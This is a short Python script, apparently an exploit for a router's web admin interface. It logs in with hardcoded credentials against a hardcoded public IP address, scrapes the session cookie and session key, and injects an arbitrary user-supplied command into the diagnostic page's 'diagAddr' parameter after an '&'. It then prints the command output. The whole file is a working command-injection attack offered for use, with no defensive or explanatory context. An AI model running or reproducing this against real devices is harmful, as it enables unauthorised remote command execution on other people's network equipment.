import requests

ip = '85.105.16.101'#input('IP: ')
username = 'admin'#input('Kullanıcı Adı: ')
password = '310894'#input('Şifre: ')

url = 'http://' + ip + '/login/login-page.cgi'
params = {'AuthName': username, 'AuthPassword': password}
r = requests.post(url, data=params)

session = r.headers['Set-Cookie'].split(';')[0].split('=')[1]
print('SESSION Cookie = ' + session)

url = 'http://' + ip + '/pages/connectionStatus/content/networkMap.html'
cookies = {'SESSION': session}
r = requests.get(url, cookies=cookies)

glbSessionKey = r.text.split('glbSessionKey = "')[1].split('"')[0]
print('sessionKey = ' + glbSessionKey)


command = input()
url = 'http://' + ip + '/pages/tabFW/disagnostic-general.cgi'
cookies = {'SESSION': session}
params = {'sessionKey': glbSessionKey, 'diagTestType' : '1', 'diagAddr' : '&' + command}

r = requests.post(url, cookies=cookies, data=params)

url = 'http://' + ip + '/pages/maintenance/disagnostic/diagResult.html'
cookies = {'SESSION': session}

r = requests.get(url, cookies=cookies)
print(r.text)